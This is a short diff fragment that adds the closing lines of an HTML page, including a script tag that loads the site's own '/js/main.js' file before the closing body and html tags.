+    <script src="/js/main.js"></script>
+  </body>
+</html>
